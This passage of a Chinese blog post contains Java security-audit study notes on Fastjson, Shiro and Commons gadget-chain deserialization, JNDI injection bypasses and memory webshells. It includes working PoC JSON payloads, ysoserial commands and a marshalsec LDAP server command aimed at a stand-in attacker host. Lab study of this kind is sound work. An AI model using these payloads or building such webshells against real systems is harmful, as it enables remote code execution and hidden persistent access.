dnslog或者创建文件或者反弹shell啥的）</li><li>rmi将远程加载得到的class（恶意代码），作为响应返回给靶机服务器。<br>靶机服务器执行了恶意代码，被攻击者成功利用。</li></ol></li></ul><h4 id="Jndi注入原理"><a href="#Jndi注入原理" class="headerlink" title="Jndi注入原理"></a>Jndi注入原理</h4><ul><li><p>JNDI即Java Naming and Directory Interface（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</p></li><li><p>JNDI 注入，即当开发者在定义 <code>JNDI</code> 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意载荷，造成注入攻击。</p></li></ul><h4 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h4><h5 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h5><ul><li><p>FastjsonController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(userStr);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>加入User类解析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">private</span> Integer age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(Integer age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行后发现传入其他类解析后默认执行get  set类方法</p></li><li><p>构造poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.fastjson.demos.web;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastjsonController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//触发fastjson反序列化用到JSON.parseObject,JSON.parse()</span><br><br>        String str=<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:31&#125;&quot;</span>;<br>        String userStr=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.kuang.fastjson.demos.web.User\&quot;,\&quot;name\&quot;:\&quot;xiaodisec\&quot;,\&quot;age\&quot;:21&#125;&quot;</span>;<br>        String poc=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://172.31.80.1:1389/fjfljn\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> JSON.parseObject(poc);<br>        System.out.println(data);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>成功弹出计算器！！！</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A132.png"></p></li><li><p>反序列化原理分析</p><ul><li><p>传入其他类解析时会调用  getdataSourceName，setdataSourceName，</p><pre><code class="hljs">                                         getautoCommit，setautoCommit方法</code></pre></li><li><p>调用setAutoCommit方法时调用了 connect方法，connect方法中调用了lookup()方法</p><p>控制注入核心触发代码</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A133.png"></p></li><li><p>分析过程</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A134.png"></p></li></ul></li></ul><h5 id="1-2-25版本"><a href="#1-2-25版本" class="headerlink" title="1.2.25版本"></a>1.2.25版本</h5><ul><li><p>发现原来的poc无法执行</p></li><li><p>定位到<code>checkAutoType()</code>方法，看一下它的逻辑：如果开启了<code>autoType</code>，那么就先判断类名在不在白名单中，如果在就用<code>TypeUtils.loadClass</code>加载，如果不在就去匹配黑名单：</p><p>jndi注入需要的类名在黑名单中，autoType默认关闭，无法使用原poc</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm7ZibH49F3GjQpYAic5fibnLPIPibNDVZ3Zq8iaeA6uxPbqOxqcd536j9ztw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1"></p></li><li><p>在demo controller中添加一行代码，开启AutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>在原poc包名前加上L，后面加;</p><p>即可弹出计算器</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A135.png"></p></li><li><p>发掘两步骤的原因</p><ul><li><p>前加L，后加；，用于绕过黑名单，后续有方法去除L与；</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A136.png"></p></li><li><p>开启autoType</p><p>断点调试后发现，如果不开启autoType，不会匹配白名单，会直接爆出autoType is not support</p><p>后续代码都全部显示异常</p></li></ul></li></ul><h5 id="1-2-25-1-2-47通杀poc"><a href="#1-2-25-1-2-47通杀poc" class="headerlink" title="1.2.25-1.2.47通杀poc"></a>1.2.25-1.2.47通杀poc</h5><ul><li><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<span class="hljs-string">&quot;a&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>&#125;,<span class="hljs-string">&quot;b&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1/exp&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></td></tr></table></figure></li><li><p>测试发现能正常弹出计算器</p></li><li><p>利用步骤</p><ul><li>利用java.lang.Class将恶意类加载到mappings中</li><li>从mappings中取出恶意代码并绕过黑名单进行反序列化</li></ul></li></ul><h3 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h3><ul><li><p>shiro反序列化链分析(获取用户请求)</p><ul><li>获取cookie中rememberMe的值</li><li>对remember进行Base64解码</li><li>使用AES解密</li><li>对解密的值进行反序列化</li></ul><p>550：Shiro-550 漏洞主要是由于 Shiro 的 <em>rememberMe</em> 内容反序列化导致的命令执行漏洞。其原因是默认加密密钥硬编码在 Shiro 源码中，攻击者可以创建一个恶意对象，对其进行序列化、编码，然后将其作为 cookie 的 rememberMe 字段内容发送，Shiro 将对其解码和反序列化，导致服务器运行恶意代码。</p><p>721：Shiro-721 漏洞利用了 AES-128-CBC 加密模式的 Padding Oracle Attack。攻击者可以通过 Padding Oracle 加密生成的攻击代码来构造恶意的 rememberMe 字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行</p></li></ul><h4 id="漏洞环境搭建以及利用链分析"><a href="#漏洞环境搭建以及利用链分析" class="headerlink" title="漏洞环境搭建以及利用链分析"></a>漏洞环境搭建以及利用链分析</h4><h5 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h5><p><a href="https://www.cnblogs.com/nice0e3/p/14183173.html">Java安全之Shiro 550反序列化漏洞分析 - nice_0e3 - 博客园 (cnblogs.com)</a></p><ul><li><p>给jstl加上版本为1.2</p></li><li><p>tomcat部署工件</p></li><li><p>访问url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1:8089/samples_web_war/login.jsp<br></code></pre></td></tr></table></figure></li><li><p>登录时抓取数据包</p></li><li><p>在返回包中找到cookie关键字为rememberMe</p></li><li><p>通过关键字爆破密钥并检测</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A137.png"></p></li><li><p>漏洞分析</p></li><li><p>在DefaultSecurityManager类的rememberMeSuccessfulLogin方法处下断点</p><p>目的：</p><ul><li>shiro登陆操作执行逻辑</li><li>反序列化漏洞的产生</li><li>利用条件</li></ul></li><li><p>追踪函数后发现</p><ul><li><p>加密：序列化-&gt;aes加密-&gt;base64加密-&gt;存入cookie</p></li><li><p>接受序列化数据解密</p><p>接受解密：base64解码-&gt;aes解密-&gt;反序列化</p></li></ul></li><li><p>调试时发现的AES加密密钥</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A138.png"></p><p>key数组可利用python脚本还原为原密钥字符串</p></li><li><p>shiro反序列化无法利用fastjson的利用链</p><ul><li><p>原因</p><ul><li><p>fastjson利用方法：调用JdbcRowSetImpl类，通过set，get方法触发lookup方法传参(反序列化自定义方法)，远程调用脚本</p></li><li><p>shiro反序列化：利用原生反序列化函数：readObject  writeObject  ObjectInputStream(漏洞点)</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A139.png"></p></li><li><p>shiro可能有JdbcRowSetImpl类，不满足触发set，get条件</p></li></ul></li></ul></li><li><p>利用工具使用利用链执行命令，成功弹出计算器</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A140.png"></p></li></ul><h4 id="cc利用链分析"><a href="#cc利用链分析" class="headerlink" title="cc利用链分析"></a>cc利用链分析</h4><ul><li><p>CC链，全称为CommonsCollections链，是指在Java反序列化漏洞中利用Apache Commons Collections库中的特定类和方法，构造出一条可以执行任意代码的调用链。CC链的核心在于利用反射机制，通过一系列的类和方法调用，最终达到执行恶意代码的目的。</p></li><li><p>攻击链的选取与框架加载的外部库有关，外部库中存在原生的漏洞</p></li><li><p>CB链分析：<a href="https://www.freebuf.com/articles/web/319397.html">关于我学渗透的那档子事之Java反序列化-CB链 - FreeBuf网络安全行业门户</a></p></li><li><p>知识要点</p><ul><li><p>入口点：触发反序列化的重写readObject方法</p></li><li><p>getProperty()方法</p><p>CB里面的类方法  对对象的一个方法进行调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PropertyUtils.getProperty(new Person(),&quot;name&quot;);</span><br><span class="hljs-comment">//自动调用Person对象里面的getName方法</span><br>PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>(),<span class="hljs-string">&quot;outputProperties&quot;</span>)<br><span class="hljs-comment">//自动调用TemplatesImpl对象里面的getOutputProperties方法</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>漏洞复现及CB链分析</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//将利用链分为三部分</span><br><br>TemplatesImpt类-&gt;调用恶意类<br><br>BeanComparator类-&gt;利用javabean调用getOutputProperties()<br><br>PriorityQueue类-&gt;反射调用PropertyUtils.getPropert<br></code></pre></td></tr></table></figure><ul><li><p>入口点</p><p>PriorityQueue #readObject -&gt; heapify() -&gt; siftDown -&gt; siftDownUsingComparator -&gt; comparator.compare</p><p>-&gt; BeanComparator.compare</p><p>BeanComparator.compare会执行PropertyUtils.getProperty</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o1, <span class="hljs-built_in">this</span>.property);<br><span class="hljs-type">Object</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> PropertyUtils.getProperty(o2, <span class="hljs-built_in">this</span>.property);<br><br>o1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>()<br>property=outputProperties<br>会自动调用TemplatesImpl#getOutputProperties方法<br></code></pre></td></tr></table></figure><p>条件</p><ul><li>size &gt;&#x3D;2</li><li>comparator !&#x3D; null</li><li>property  !&#x3D;  null</li></ul><p>TemplatesImpl 链，属于CC链分析  RCE</p><p>-&gt;  TemplatesImpl #getOutputProperties</p><p>-&gt;  newTransformer()</p><p>-&gt;  TransformerImpl(getTransletInstance())</p><p>-&gt;  defineTransletClasses()</p><p>-&gt;  loader.defineClass(执行命令)</p><p>条件：</p><p>_name !&#x3D;null</p><p>_class   !&#x3D;null</p><p>_bytecodes !&#x3D; null (命令参数)</p></li></ul></li><li><p>loader.defineClass</p><p><code>ClassLoader.defineClass</code> 是 <code>ClassLoader</code> 的一个受保护方法，它允许将字节数组转换为 Java 类。攻击者可借助它加载任意恶意类（即“内存马”或包含命令执行的类）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = loader.defineClass(name, classBytes, <span class="hljs-number">0</span>, classBytes.length);<br></code></pre></td></tr></table></figure><p>这样，<code>classBytes</code> 中的字节码就会被定义为类并加载进 JVM，随之可能执行静态代码块或构造方法中携带的恶意逻辑。</p><p><code>defineClass</code> 本身不执行命令，它只是<strong>将字节码加载为类</strong>。真正执行命令的行为，通常发生在：</p><ul><li>类的<strong>静态代码块</strong>；</li><li>类的<strong>构造方法</strong>；</li><li>类的方法中，被随后立即调用。</li></ul><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilClass</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一旦被加载（通过 <code>defineClass</code>），这个类的静态代码块就会立即执行，造成命令执行。</p></li><li><p>反序列化简化流程图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">反序列化入口<br>     ↓<br>CC利用链触发（TemplatesImpl、InvokerTransformer 等）<br>     ↓<br>调用 defineClass(classBytes)<br>     ↓<br>加载恶意类<br>     ↓<br>静态块/构造器执行<br>     ↓<br>命令执行（如 Runtime.getRuntime().<span class="hljs-built_in">exec</span>）<br></code></pre></td></tr></table></figure></li><li><p>反序列化构造cc链能够命令执行的核心</p><ol><li><code>TemplatesImpl.getOutputProperties()</code> 会触发内部 <code>defineTransletClasses()</code>；</li><li>这个方法调用了 <code>defineClass()</code>，加载了我们注入的恶意类；</li><li>恶意类的 <strong>静态代码块</strong> 被立即执行 → <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>；</li></ol></li></ul><h3 id="JNDI注入及其高版本绕过"><a href="#JNDI注入及其高版本绕过" class="headerlink" title="JNDI注入及其高版本绕过"></a>JNDI注入及其高版本绕过</h3><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 (tttang.com)</a></p><ul><li><p>JNDI注入触发的三个模式</p><ol><li>远程引用模式(基于JDK版本)</li><li>本地引用模式(基于依赖Jar)</li><li>反序列化模式(基于gadget链)</li></ol></li><li><p>jndi注入的版本限制</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A141.png"></p><p>高版本无法注入的原因：</p><ul><li><p>com.sun.jndi.rmi.object.trustURLCodebase，</p><p>com.sun.jndi.cosnaming.object.trustURLCodebase的默认值变为false，即不允许从远程的Codebase加载Reference工厂类，没限制加载本地文件</p></li></ul></li><li><p>高版本绕过方法</p><ul><li><p>利用jar包</p><p><a href="https://tttang.com/archive/1405/#toc_0x01-beanfactory">探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 (tttang.com)</a></p><p>白盒审计时查看引入了什么依赖，根据引入的依赖利用本地jar包，进行jndi注入</p></li><li><p>利用反序列化链(同样需要依赖包)</p><p><a href="https://blog.csdn.net/mole_exp/article/details/121141042">JNDI注入利用原理及绕过高版本JDK限制_jndi注入的限制-CSDN博客</a></p><p><a href="https://www.cnblogs.com/bitterz/p/15946406.html#3-%E5%9F%BA%E4%BA%8E%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E6%B5%81%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce">java高版本下各种JNDI Bypass方法复现 - bitterz - 博客园 (cnblogs.com)</a></p><p>原理：</p><p>即使：</p><ul><li>远程类加载被禁用了（禁止 <code>http://...</code> 类加载）</li><li><code>trustURLCodebase=false</code></li></ul><p>只要 <strong>Java 会尝试读取对象并反序列化</strong>（如通过 <code>ObjectInputStream</code>），攻击者就可以在返回中嵌入<strong>序列化 Gadget 链对象</strong>，并在目标中激活它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span class="hljs-string">&quot;calc&quot;</span> &gt; poc.txt<br><span class="hljs-built_in">cat</span> poc.txt|base64.txt(替换换行符)<br>ldap://127.0.0.1:6666/exp<br><br><span class="hljs-comment">#需要依赖包</span><br>&lt;groupId&gt;commoms-collections&lt;/groupId&gt;<br>&lt;artifactId&gt;commons-conllections&lt;/artfactId&gt;<br></code></pre></td></tr></table></figure><p>在 Java 8u191+ 等高版本中，虽然远程类加载被禁用了（<code>trustURLCodebase=false</code>），<strong>但如果目标系统中已经存在可用的 Gadget 链（利用链）类，就可能通过 JNDI 注入触发反序列化，从而执行任意命令</strong>。</p><p> 绕过思路：利用已有 Gadget 链</p><p> 条件</p><ol><li><strong>JNDI 注入点存在</strong>（如 Log4j、Tomcat 配置等）</li><li><strong>目标服务器已有可利用的类</strong>（如 commons-collections、Groovy、Spring 组件等）</li><li><strong>支持 LDAP 或 RMI 绑定 Object 实例</strong>（不是远程类加载，而是对象反序列化）</li></ol><p>绕过方式技术细节</p><p>1.使用 LDAP 服务返回 <strong>序列化对象（不是类引用）</strong></p><p>攻击者搭建恶意 LDAP 服务器，当目标发起 JNDI 查询时，返回一个已经构造好的 Java 序列化对象（Object），而不是远程类的 URL。</p><p> <strong>即不需要 trustURLCodebase &#x3D; true</strong>，而是利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference → Referenceable → 特定 Gadget 链的序列化对象<br></code></pre></td></tr></table></figure><ol start="2"><li>构造 Gadget 链（利用 ysoserial 工具）</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&#x27;calc&#x27;</span> &gt; payload.ser<br></code></pre></td></tr></table></figure><p>使用 <code>marshalsec</code> 项目中的 LDAPServer 模拟 LDAP 服务，返回这个对象。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://attacker.com/#Exploit&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><ul><li><p>web代码执行流程</p><p><img src="/img/java%E5%AE%A1%E8%AE%A1/java%E5%AE%A1%E8%AE%A142.png"></p></li><li><p>servlet层触发的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//有请求必触发的方法</span><br>requestInitialized<br>requestDestroyed    <br></code></pre></td></tr></table></figure></li><li><p>内存马的类型</p><ol><li>Listener内存马：监听特定事件并执行恶意代码。</li><li>Filter内存马：拦截和修改HTTP请求和响应。</li><li>Servlet内存马：直接处理HTTP请求并执行恶意命令。</li></ol><p><img src="https://.3001.net//s/20221209/1670591008_63933220d0b7298b0fb3f.png!small"></p></li></ul><h4 id="Listen中内存马"><a href="#Listen中内存马" class="headerlink" title="Listen中内存马"></a>Listen中内存马</h4><ul><li><p>原理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">监听器指向class: com.example.listenshell.Test<br><br>applicationListeners=com.example.listenshell.Test<br>StanderContext#contxet-&gt;ApplicationContext#context<br><br>项目启动 listen在运行时  class来源是怎么获取的<br>StandardContext#addApplicationEventListener<br>内存:添加一个listen <br><br>Servlet -&gt; ApplicationContext -&gt; StandardContext<br></code></pre></td></tr></table></figure></li></ul><h4 id="Filter中内存马"><a href="#Filter中内存马" class="headerlink" title="Filter中内存马"></a>Filter中内存马</h4><ul><li><p>filter类中的方法</p><ul><li>init–初始化</li><li>doFilter – 执行点</li><li>destory –  销毁</li></ul></li><li><p>filter访问流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Servlet -&gt; context-&gt;ApplicationFilterConfig-&gt;context-&gt;StandardContext-&gt;filterConfigs<br><br>ApplicationFilterConfig#filterConfig context -&gt; StandardContext#<br><br>filterConfigs<br>filterDefs#  配置名称和class<br>filterMaps   配置名称url路由<br><br>ApplicationFilterConfig#filterConfig( filterDef(filterClass filterName))<br><br>addFilterDef  添加配置名称和class<br>addFilterMap  addFilterMapBefore  添加配置名称和url路由<br></code></pre></td></tr></table></figure></li><li><p>内存马实现</p><p>– 相当于添加一个Filter</p><ol><li>Servlet获取用户访问</li><li>判断触发(是否为null)</li><li>如未触发则添加Filter</li><li>向对象成员中添加配置信息</li></ol></li><li><p>Filter内存马编写</p><p><a href="https://zhuanlan.zhihu.com/p/404057893">【安全记录】通过jsp文件注入内存马 - 知乎 (zhihu.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span 